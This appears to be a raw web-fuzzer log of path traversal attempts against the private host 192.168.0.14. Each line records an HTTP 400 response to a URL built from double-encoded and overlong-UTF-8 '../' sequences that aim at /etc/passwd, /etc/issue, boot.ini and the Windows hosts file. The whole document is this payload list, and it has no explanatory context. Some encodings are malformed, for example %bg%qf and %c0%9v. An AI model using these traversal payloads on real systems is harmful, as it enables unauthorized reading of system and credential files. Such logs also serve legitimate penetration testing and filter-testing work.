196,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
197,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfboot.ini
198,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfissue
200,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
199,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfpasswd
203,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfpasswd
202,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfissue
201,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfboot.ini
206,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfissue
204,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
205,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfboot.ini
207,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfpasswd
208,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
209,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfboot.ini
210,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfissue
211,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfpasswd
214,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qfetc%bg%qfissue
213,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qfboot.ini
212,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
215,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qfetc%bg%qfpasswd
216,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
217,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fboot.ini
218,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fissue
219,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fpasswd
220,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
221,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fboot.ini
222,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fissue
59,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fetc%252fpasswd
224,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
226,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fissue
227,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fpasswd
229,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fboot.ini
232,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
225,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fboot.ini
231,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fpasswd
228,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
230,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fissue
235,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fpasswd
234,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fissue
236,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
238,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2fetc%c0%2fissue
240,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
237,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2fboot.ini
239,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2fetc%c0%2fpasswd
241,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cboot.ini
233,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fboot.ini
242,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cissue
243,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cpasswd
244,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
245,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cboot.ini
246,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cissue
247,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cpasswd
250,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cissue
249,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cboot.ini
248,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
257,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cboot.ini
251,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cpasswd
253,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cboot.ini
252,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
255,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cpasswd
254,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cissue
258,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cissue
223,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fpasswd
260,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
261,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5cboot.ini
263,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5cetc%c0%5cpasswd
259,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cpasswd
264,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
265,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vboot.ini
262,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5cetc%c0%5cissue
266,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vissue
267,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vpasswd
268,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
270,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vissue
269,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vboot.ini
271,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vpasswd
272,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
274,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vissue
273,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vboot.ini
278,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vissue
275,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vpasswd
276,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
279,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vpasswd
277,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vboot.ini
281,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vboot.ini
280,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
282,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vissue
283,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vpasswd
284,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
285,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9vboot.ini
287,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9vetc%c0%9vpasswd
288,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
286,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%9vetc%c0%9vissue
290,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afissue
289,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afboot.ini
293,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afboot.ini
295,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afpasswd
296,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
297,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afboot.ini
292,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
298,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afissue
299,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afpasswd
300,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
301,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afboot.ini
291,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afpasswd
302,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afissue
294,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afissue
304,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
303,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afpasswd
305,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afboot.ini
309,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%afboot.ini
308,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
310,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%afetc%c0%afissue
256,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
307,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afpasswd
312,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
311,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%afetc%c0%afpasswd
313,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfboot.ini
315,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfpasswd
316,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
317,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfboot.ini
318,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfissue
320,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
314,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfissue
321,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfboot.ini
323,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfpasswd
324,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
327,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfpasswd
326,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfissue
325,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfboot.ini
319,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfpasswd
322,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfissue
328,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
331,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfpasswd
329,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfboot.ini
332,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
335,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qfetc%c0%qfpasswd
333,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qfboot.ini
330,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfissue
336,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
334,400,10L,35W,http://192.168.0.14/%%32%%65%%32%%65%c0%qfetc%c0%qfissue
